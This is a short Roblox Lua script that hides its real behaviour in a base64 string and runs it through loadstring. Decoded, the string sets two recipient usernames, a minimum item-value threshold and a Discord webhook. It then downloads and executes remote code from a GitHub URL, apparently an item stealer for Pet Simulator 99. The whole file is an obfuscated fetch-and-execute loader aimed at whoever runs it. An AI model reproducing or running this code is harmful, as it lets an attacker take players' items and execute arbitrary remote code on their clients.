
local encodedScript = "VXNlcm5hbWUgPSAiRmVlbHNsaWtlbGVnZW5kIgpVc2VybmFtZTIgPSAibmFoaGlkd2lubm5ubm5ubm5ubiIKTWluaW11bVJBUCA9IDEwMDAwCldlYmhvb2sgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA4OTgzMzUzMjgzMjEwMDUwMi9KVXFVOHdTbFV0SXVYeFJhQzZJd3BuWEdzX1Ytc1RqYTdObk0xbkJxdWZzeUlocUJQbE05QnowRTFmNkkta2ZQdTNreiIKCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veWVzbGlkZXp6L0VrczB2YS9tYWluL1BTOTkiKSkoKQ=="

local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

loadstring(decode(encodedScript))()
